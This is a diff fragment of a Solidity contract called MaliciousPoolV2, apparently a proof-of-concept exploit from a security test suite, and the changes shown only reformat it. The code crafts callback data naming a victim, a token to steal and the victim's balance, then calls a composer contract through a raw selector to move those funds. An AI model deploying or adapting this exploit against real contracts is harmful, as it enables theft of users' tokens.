@@ -44,8 +44,9 @@ contract MaliciousPoolV2 {
         bytes memory maliciousCallbackData =
             abi.encodePacked(victim, tokenToSteal, address(0), uint112(victimBalance), uint8(0), uint16(transferCall.length), transferCall);
 
-        (bool success,) = address(composer)
-            .call(abi.encodeWithSelector(bytes4(0x10d1e85c), address(composer), uint256(1), uint256(0), new bytes(0), maliciousCallbackData));
+        (bool success,) = address(composer).call(
+            abi.encodeWithSelector(bytes4(0x10d1e85c), address(composer), uint256(1), uint256(0), new bytes(0), maliciousCallbackData)
+        );
     }
 
     function transferFrom(address from, address to, uint256 value) external returns (bool) {
@@ -53,5 +54,3 @@ contract MaliciousPoolV2 {
         return true;
     }
 }
-
-
